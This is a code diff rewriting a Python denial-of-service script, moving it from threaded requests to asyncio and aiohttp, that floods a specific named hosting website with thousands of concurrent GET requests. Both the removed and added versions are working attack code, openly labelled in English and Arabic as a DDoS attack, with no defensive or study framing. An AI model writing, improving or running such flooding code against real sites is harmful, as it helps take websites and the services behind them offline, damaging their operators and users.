@@ -1,37 +1,24 @@
-import requests
-import threading
+import asyncio
+import aiohttp
 
-# Target website URL
-url = "https://mena-hosting.net/"
+target_url = "https://mena-hosting.net/"  # قم بتعديلها لتكون عنوان الموقع المستهدف
+num_requests = 10000  # عدد الطلبات التي ستتم إرسالها
+concurrency = 1000  # عدد الاتصالات المتزامنة
 
-# Number of threads to use
-num_threads = 100
-
-# Number of requests per thread
-num_requests = 1000
-
-# Function to send HTTP requests
-def send_request():
+async def send_requests(session):
+    tasks = []
     for _ in range(num_requests):
-        try:
-            response = requests.get(url)
-            print("Request sent to", url, "Status:", response.status_code)
-        except:
-            pass
+        task = asyncio.ensure_future(session.get(target_url))
+        tasks.append(task)
+        if len(tasks) >= concurrency:
+            await asyncio.gather(*tasks)
+            tasks = []
+    await asyncio.gather(*tasks)
 
-# Create multiple threads to send requests
-threads = []
-for _ in range(num_threads):
-    t = threading.Thread(target=send_request)
-    t.daemon = True
-    threads.append(t)
+async def main():
+    async with aiohttp.ClientSession() as session:
+        await send_requests(session)
 
-# Start the threads
-for t in threads:
-    t.start()
-
-# Wait for all threads to complete
-for t in threads:
-    t.join()
-
-print("DDoS attack completed.")
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
+print("تم إرسال الهجوم بنجاح!")
